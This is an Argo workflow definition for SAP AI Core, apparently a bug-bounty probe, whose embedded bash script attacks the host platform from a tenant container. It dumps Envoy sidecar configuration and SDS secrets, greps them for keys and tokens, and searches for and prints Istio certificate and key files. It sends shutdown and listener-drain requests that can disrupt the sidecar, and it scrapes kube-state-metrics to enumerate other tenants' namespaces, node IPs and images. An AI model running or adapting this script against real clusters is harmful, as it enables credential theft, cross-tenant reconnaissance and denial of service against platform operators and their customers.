apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "19.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V19 DEEP PROBE ==="
        
        # === ENVOY SIDECAR ADMIN (localhost:15000) ===
        echo "=== ENVOY ADMIN ==="
        
        echo "--- /server_info ---"
        curl -s --connect-timeout 3 "http://localhost:15000/server_info" 2>&1 | head -c 1000
        echo ""
        
        echo "--- /clusters (service mesh topology) ---"
        CLUSTERS=$(curl -s --connect-timeout 3 "http://localhost:15000/clusters" 2>&1)
        echo "$CLUSTERS" | head -c 3000
        echo ""
        echo "CLUSTER_BYTES=$(echo "$CLUSTERS" | wc -c)"
        # Extract unique service names
        echo "UNIQUE_SERVICES:"
        echo "$CLUSTERS" | grep -E "^[a-z]" | head -50
        echo ""
        
        echo "--- /config_dump (full envoy config) ---"
        CONFIG=$(curl -s --connect-timeout 5 "http://localhost:15000/config_dump" 2>&1)
        echo "CONFIG_BYTES=$(echo "$CONFIG" | wc -c)"
        # Look for secrets/certs in config
        echo "$CONFIG" | grep -i -E "(secret|cert|key|password|token)" | head -20
        echo ""
        
        echo "--- /listeners ---"
        curl -s --connect-timeout 3 "http://localhost:15000/listeners" 2>&1 | head -c 2000
        echo ""
        
        echo "--- /certs ---"
        curl -s --connect-timeout 3 "http://localhost:15000/certs" 2>&1 | head -c 3000
        echo ""
        
        echo "--- /stats (look for upstream connections) ---"
        curl -s --connect-timeout 3 "http://localhost:15000/stats" 2>&1 | grep -E "(upstream_cx|membership)" | head -30
        echo ""
        
        # === ISTIO CERTIFICATE EXTRACTION ===
        echo "=== ISTIO CERTS ==="
        
        # Check for Istio cert mount paths
        echo "--- Cert file search ---"
        find / -name "*.pem" -o -name "*.crt" -o -name "*.key" -o -name "cert-chain*" -o -name "root-cert*" 2>/dev/null | head -20
        echo ""
        
        # Standard Istio cert locations
        for certpath in           "/var/run/secrets/istio"           "/var/run/secrets/istio/root-cert.pem"           "/var/run/secrets/istio/cert-chain.pem"           "/var/run/secrets/istio/key.pem"           "/etc/certs"           "/etc/istio/proxy"           "/var/run/secrets/tokens"           "/var/run/secrets/credentials"; do
          if [ -e "$certpath" ]; then
            echo "FOUND: $certpath"
            ls -la "$certpath" 2>/dev/null
            if [ -f "$certpath" ]; then
              head -c 500 "$certpath"
              echo ""
            fi
          fi
        done
        
        # Check /proc for cert data in sidecar process
        echo "--- Process list ---"
        ps aux 2>/dev/null | head -20
        echo ""
        
        # Try to extract SDS (Secret Discovery Service) certs via Envoy
        echo "--- Envoy SDS secrets ---"
        curl -s --connect-timeout 3 "http://localhost:15000/config_dump?resource=dynamic_active_secrets" 2>&1 | head -c 3000
        echo ""
        
        # Try Istio debug endpoints
        echo "--- Istio pilot-agent ---"
        curl -s --connect-timeout 3 "http://localhost:15020/healthz/ready" 2>&1 | head -c 200
        echo ""
        curl -s --connect-timeout 3 "http://localhost:15020/debug/ndsz" 2>&1 | head -c 500
        echo ""
        curl -s --connect-timeout 3 "http://localhost:15020/debug/endpointz" 2>&1 | head -c 1000
        echo ""
        curl -s --connect-timeout 3 "http://localhost:15020/quitquitquit" 2>&1 | head -c 200
        echo ""
        
        # === ENVOY CONFIG MODIFICATION (test if writable) ===
        echo "=== ENVOY MODIFY TEST ==="
        # Try to add a new route via admin API
        echo "--- POST /logging?level=debug ---"
        curl -s -X POST --connect-timeout 3 "http://localhost:15000/logging?level=debug" 2>&1 | head -c 500
        echo ""
        
        # Try to drain listeners (DoS test - just checking if writable)
        echo "--- POST /drain_listeners (check only) ---"
        curl -s -X POST --connect-timeout 3 "http://localhost:15000/drain_listeners?graceful" 2>&1 | head -c 200
        echo ""
        
        # === KSM DEEP ANALYSIS ===
        echo "=== KSM DEEP ==="
        
        # Get full KSM pods dump and extract key data
        KSM_DATA=$(curl -s --connect-timeout 10 "http://100.106.241.163:8080/metrics" 2>&1)
        echo "KSM_TOTAL_BYTES=$(echo "$KSM_DATA" | wc -c)"
        
        # Extract unique namespaces
        echo "NAMESPACES:"
        echo "$KSM_DATA" | grep -oE 'namespace="[^"]+"' | sort -u
        echo ""
        
        # Count pods per namespace
        echo "PODS_PER_NS:"
        echo "$KSM_DATA" | grep "^kube_pod_info" | grep -oE 'namespace="[^"]+"' | sort | uniq -c | sort -rn
        echo ""
        
        # Look for secrets references
        echo "SECRET_REFS:"
        echo "$KSM_DATA" | grep -i "secret" | head -20
        echo ""
        
        # Look for container images (reveal tech stack)
        echo "CONTAINER_IMAGES:"
        echo "$KSM_DATA" | grep -oE 'image="[^"]+"' | sort -u | head -30
        echo ""
        
        # Look for resource group namespaces (other tenants)
        echo "TENANT_NAMESPACES:"
        echo "$KSM_DATA" | grep -oE 'namespace="rg-[^"]+"' | sort -u
        echo ""
        
        # Extract host IPs (node info)
        echo "HOST_IPS:"
        echo "$KSM_DATA" | grep -oE 'host_ip="[^"]+"' | sort -u
        echo ""
        
        # Extract priority classes (security context hints)
        echo "PRIORITY_CLASSES:"
        echo "$KSM_DATA" | grep -oE 'priority_class="[^"]+"' | sort -u
        echo ""
        
        echo "=== V19 COMPLETE ==="
